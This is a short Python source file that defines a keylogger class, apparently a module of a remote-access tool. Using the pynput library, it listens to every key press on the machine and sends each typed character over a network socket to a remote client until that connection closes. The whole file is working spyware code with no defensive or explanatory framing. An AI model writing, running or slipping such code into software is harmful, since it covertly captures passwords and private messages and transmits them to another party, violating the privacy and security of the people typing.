from pynput import keyboard
import threading

class Keylogger(threading.Thread):
    def __init__(self, client_socket):
        super().__init__()
        self.client_socket = client_socket
        self.listener = keyboard.Listener(on_press=self.log)

    def run(self):
        self.listener.start()

        while True:
            # Check if the client is still connected
            if not self.client_socket.fileno() == -1:
                continue

            # stop listener and wait for thread to finish
            self.listener.stop()
            self.listener.join()
            break

    def log(self, key):
        try:
            # Send the character over the socket to the client
            if hasattr(key, "char"):
                self.client_socket.send(str(key.char).encode())
        except Exception as e:
            print(f"Error while logging: {e}")
